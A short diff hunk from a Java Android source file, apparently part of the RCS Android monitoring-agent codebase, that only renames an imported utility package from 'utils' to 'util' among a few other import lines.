@@ -19,7 +19,7 @@ import com.ht.RCSAndroidGUI.agent.CrisisAgent;
 import com.ht.RCSAndroidGUI.conf.Option;
 import com.ht.RCSAndroidGUI.event.EventConf;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
-import com.ht.RCSAndroidGUI.utils.Check;
+import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
 // Singleton Class
